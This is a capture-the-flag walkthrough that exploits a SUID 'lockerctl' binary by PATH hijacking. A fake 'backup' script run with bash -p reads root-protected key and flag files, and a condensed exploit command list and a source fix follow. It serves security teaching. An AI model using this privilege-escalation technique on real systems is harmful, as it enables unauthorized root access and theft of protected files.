# Step-by-Step Walkthrough — Berlin's Locker Controller CTF

## Overview
This walkthrough provides a complete solution to the Berlin's Locker Controller CTF challenge. Follow each step to understand the vulnerability and successfully retrieve both the KEY and FLAG.

---

## Step 1: Connect to the Target

First, establish an SSH connection to the target container:

```bash
ssh tokyo@localhost -p 2221
```

When prompted, enter the password: `tokyo123`

You should see a welcome message and a shell prompt.

---

## Step 2: Initial Enumeration

### 2.1 Check Your Current User and Groups

```bash
whoami
id
```

**Expected Output:**
```
tokyo
uid=1000(tokyo) gid=1000(tokyo) groups=1000(tokyo)
```

**Analysis:** You are user `tokyo` with no special group memberships. You need to escalate privileges to read the protected files.

### 2.2 Verify the Target Files Exist (But Are Protected)

Try to read the target files to confirm they exist and are protected:

```bash
cat /opt/mint/key.txt
cat /root/flag.txt
```

**Expected Output:**
```
cat: /opt/mint/key.txt: Permission denied
cat: /root/flag.txt: Permission denied
```

**Analysis:** The "Permission denied" error (not "No such file or directory") confirms that both files exist but are protected. We need root privileges or the `lockers` group to read them. The fact that we get a permission error rather than a "file not found" error is actually useful information - it tells us the files are there, we just can't access them yet.

### 2.3 Check File Permissions

Try to list the files to see their permissions:

```bash
ls -la /opt/mint/key.txt
ls -la /root/flag.txt
```

**Expected Output:**
```
ls: cannot access '/opt/mint/key.txt': Permission denied
ls: cannot access '/root/flag.txt': Permission denied
```

**Analysis:** You cannot even list these files because the parent directories are restricted. Let's check the directory permissions instead:

```bash
ls -ld /opt/mint
ls -ld /root
```

**Expected Output:**
```
drwxr-x--- 1 root lockers 4096 ... /opt/mint
drwx------ 1 root root 4096 ... /root
```

**Analysis:**
- `/opt/mint/`: Only root and members of the `lockers` group can access (mode 750)
- `/root/`: Only root can access (mode 700)

Since we know the files exist (from the error messages when trying to read them), and based on the directory permissions and the challenge description:
- `key.txt`: Should be readable by root and members of the `lockers` group (mode 0440)
- `flag.txt`: Should be readable only by root (mode 0400)

We need root privileges to access both files.

---

## Step 3: Find Privilege Escalation Vectors

### 3.1 Search for SUID Binaries

SUID (Set User ID) binaries run with the privileges of their owner, often root. Let's find them:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Expected Output:**
```
/usr/local/bin/lockerctl
```

**Analysis:** There's a SUID binary called `lockerctl` in `/usr/local/bin/`. This is our target!

### 3.2 Examine the SUID Binary

```bash
ls -la /usr/local/bin/lockerctl
```

**Expected Output:**
```
-rwsr-xr-x 1 root root 16304 Dec 29 09:50 /usr/local/bin/lockerctl
```

**Analysis:** 
- The `s` in `-rwsr-xr-x` indicates the SUID (Set User ID) bit is set
- It's owned by `root:root`
- When executed, this binary will run with the effective user ID of root (the owner), not the user who runs it
- This is our privilege escalation vector!

**Note:** If the `file` command is available, you can also check the file type:
```bash
file /usr/local/bin/lockerctl
```
This would show something like: `ELF 64-bit LSB executable, x86-64, ...` but it's not essential for the exploit.

### 3.3 Test the Binary

Let's see what it does:

```bash
/usr/local/bin/lockerctl
```

**Expected Output:**
```
Berlin's Locker Controller
Usage:
  /usr/local/bin/lockerctl rotate <logfile>

Example:
  /usr/local/bin/lockerctl rotate /opt/lockers/logs/heist.log
```

**Analysis:** The binary takes a `rotate` command and a logfile path. Let's try running it with the example:

```bash
/usr/local/bin/lockerctl rotate /opt/lockers/logs/heist.log
echo $?
```

**Expected Output:**
```
/usr/local/sbin/backup: line 5: /var/log/lockerctl/backup-actions.log: Permission denied
1
```

**Analysis:** 
- The command executed the `backup` script (we can see it tried to write to the log file)
- It failed with "Permission denied" because the legitimate backup script doesn't have write permissions to `/var/log/lockerctl/backup-actions.log` when run as a non-root user
- Exit code `1` indicates failure
- **This is actually useful information!** It confirms:
  1. The binary is working and calling the `backup` script
  2. The binary uses PATH resolution (it found `/usr/local/sbin/backup`)
  3. When we hijack PATH, our malicious script will be called instead

The error is expected - we're about to exploit this by replacing the backup script with our own!

---

## Step 4: Understand the Binary's Behavior

### 4.1 Check What the Binary Calls

Since we can't easily decompile the binary, we can use `strings` to see what functions it uses, or we can analyze the source code if available. Alternatively, we can check what happens when we run it.

Let's check the binary for the `execvp` function:

```bash
strings /usr/local/bin/lockerctl | grep exec
```

**Expected Output:**
```
execvp
```

**Analysis:** The binary uses `execvp` - this function searches the PATH environment variable to find the program. Since it's using a **relative path** (`backup`) instead of an absolute path (like `/usr/local/sbin/backup`), this is the vulnerability!

**Note:** If `strace` is available, you can also use:
```bash
strace /usr/local/bin/lockerctl rotate /opt/lockers/logs/heist.log 2>&1 | grep -E "(exec|backup)"
```

### 4.2 Check Where the Intended Backup Script Is

```bash
ls -la /usr/local/sbin/backup
cat /usr/local/sbin/backup
```

**Expected Output:**
```
-rwxr-xr-x 1 root root 123 ... /usr/local/sbin/backup
#!/bin/bash
# Intended helper invoked by lockerctl.
set -e
LOGFILE="$1"
echo "[backup] rotated: $LOGFILE at $(date -u +%FT%TZ)" >> /var/log/lockerctl/backup-actions.log
exit 0
```

**Analysis:** There's a legitimate backup script at `/usr/local/sbin/backup`, but the SUID binary uses `execvp("backup", ...)` which searches the PATH environment variable to find `backup`.

### 4.3 Understand PATH Resolution

When a program uses `execvp("backup", ...)`, the system searches for `backup` in directories listed in the `PATH` environment variable, in order. We can control this!

Check the current PATH:

```bash
echo $PATH
```

**Expected Output:**
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Analysis:** The PATH includes `/usr/local/sbin` where the legitimate backup script is located. However, if we prepend a directory we control (like `/tmp`) to PATH, and place our own `backup` script there, the SUID binary will execute **our** script with root privileges!

---

## Step 5: Exploit the PATH Hijacking Vulnerability

### 5.1 Create a Malicious Backup Script

Create a script that will read both the KEY and FLAG files:

**IMPORTANT:** We must use `#!/bin/bash -p` (with the `-p` flag) to preserve privileges. By default, bash drops effective user ID (EUID) privileges when executing scripts for security reasons. However, the `-p` flag tells bash to preserve these privileges, which is essential for SUID exploits. Without `-p`, even though the SUID binary runs with root EUID, bash will drop it to the real UID (tokyo), and the exploit will fail.

```bash
cat > /tmp/backup << 'EOF'
#!/bin/bash -p
# Malicious backup script that steals KEY and FLAG
# The -p flag preserves effective user ID (EUID) privileges
cat /opt/mint/key.txt > /tmp/key_stolen.txt
cat /root/flag.txt > /tmp/flag_stolen.txt
chmod 666 /tmp/key_stolen.txt /tmp/flag_stolen.txt
EOF
```

### 5.2 Make the Script Executable

```bash
chmod +x /tmp/backup
ls -la /tmp/backup
```

**Expected Output:**
```
-rwxr-xr-x 1 tokyo tokyo 123 ... /tmp/backup
```

### 5.3 Hijack the PATH

Modify PATH to prioritize `/tmp` (where our malicious script is):

```bash
export PATH=/tmp:$PATH
echo $PATH
```

**Expected Output:**
```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Analysis:** Now when the system searches for `backup`, it will find `/tmp/backup` first, before the legitimate `/usr/local/sbin/backup`.

### 5.4 Execute the SUID Binary

Run the SUID binary with the hijacked PATH:

```bash
/usr/local/bin/lockerctl rotate /opt/lockers/logs/heist.log
```

**Expected Output:**
```
(No output, but the script executed successfully)
```

**Analysis:** The SUID binary ran with root privileges (effective UID 0), searched PATH for `backup`, found our malicious script in `/tmp`, and executed it. Because we used `#!/bin/bash -p`, bash preserved the root privileges, allowing our script to read both protected files and save them to `/tmp/`.

### 5.5 Verify the Exploit Worked

Check if the files were created:

```bash
ls -la /tmp/*stolen*
```

**Expected Output:**
```
-rw-rw-rw- 1 root root 28 ... /tmp/key_stolen.txt
-rw-rw-rw- 1 root root 28 ... /tmp/flag_stolen.txt
```

**Analysis:** Perfect! The files were created by root (notice the owner is `root`), and they're readable by everyone (mode 666).

---

## Step 6: Retrieve the KEY and FLAG

### 6.1 Read the KEY

```bash
cat /tmp/key_stolen.txt
```

**Expected Output:**
```
KEY_12345_BERLIN_LOCKER
```

**Analysis:** This is the KEY value from `/opt/mint/key.txt`.

### 6.2 Read the FLAG

```bash
cat /tmp/flag_stolen.txt
```

**Expected Output:**
```
FLAG_67890_MONEY_HEIST_SUCCESS
```

**Analysis:** This is the FLAG value from `/root/flag.txt`.

---

## Step 7: Verify Direct Access (Optional)

For completeness, let's verify we can now read the original files. Actually, we still can't read them directly as user `tokyo`, but we successfully extracted their contents through the privilege escalation.

To confirm the values are correct, you could also check the log file that the legitimate backup script would have written to:

```bash
cat /var/log/lockerctl/backup-actions.log
```

**Expected Output:**
```
(May show previous backup actions, but our malicious script didn't write here)
```

---

## Summary

### What We Learned

1. **SUID Binaries**: Programs with the SUID bit set run with the privileges of their owner (often root).

2. **PATH Hijacking**: When a privileged program uses relative paths (like `execvp("backup", ...)`) instead of absolute paths, it searches the `PATH` environment variable. Since environment variables are inherited from the calling process, an attacker can control which program gets executed.

3. **Privilege Escalation**: By controlling the PATH and placing a malicious script in a directory that appears first in PATH, we can trick a SUID binary into executing our code with elevated privileges.

4. **Bash Privilege Preservation**: By default, bash drops effective user ID (EUID) privileges when executing scripts. The `-p` flag (`#!/bin/bash -p`) tells bash to preserve these privileges, which is essential for SUID exploits.

### The Vulnerability

The vulnerability in `lockerctl.c` is on line 42:
```c
execvp("backup", args);  // Uses relative path - vulnerable!
```

**The Fix:** Use an absolute path instead:
```c
execv("/usr/local/sbin/backup", args);  // Safe - uses absolute path
```

Or sanitize the PATH before execution:
```c
setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
execvp("backup", args);
```

### Key Takeaways

- **Never use relative paths in SUID binaries** - Always use absolute paths
- **Sanitize environment variables** - Don't trust inherited environment variables in privileged programs
- **Principle of least privilege** - SUID binaries should only do what's necessary, not provide full root access

---

## Challenge Complete! 🎉

You have successfully:
- ✅ Identified the SUID binary vulnerability
- ✅ Exploited PATH hijacking to escalate privileges
- ✅ Retrieved the KEY: `KEY_12345_BERLIN_LOCKER`
- ✅ Retrieved the FLAG: `FLAG_67890_MONEY_HEIST_SUCCESS`

Submit both values to complete the challenge!

---

## Quick Reference: Exploit Commands

For students who want a condensed version, here are the essential commands:

```bash
# 1. Connect
ssh tokyo@localhost -p 2221
# Password: tokyo123

# 2. Find SUID binary
find / -perm -4000 -type f 2>/dev/null

# 3. Create malicious backup script (NOTE: Use bash -p to preserve privileges!)
cat > /tmp/backup << 'EOF'
#!/bin/bash -p
cat /opt/mint/key.txt > /tmp/key_stolen.txt
cat /root/flag.txt > /tmp/flag_stolen.txt
chmod 666 /tmp/key_stolen.txt /tmp/flag_stolen.txt
EOF

# 4. Make executable
chmod +x /tmp/backup

# 5. Hijack PATH
export PATH=/tmp:$PATH

# 6. Execute SUID binary
/usr/local/bin/lockerctl rotate /opt/lockers/logs/heist.log

# 7. Read stolen files
cat /tmp/key_stolen.txt
cat /tmp/flag_stolen.txt
```

**Note:** The KEY and FLAG values in this walkthrough are examples. Your actual values will be different and are generated from the `.env` file when the container starts.

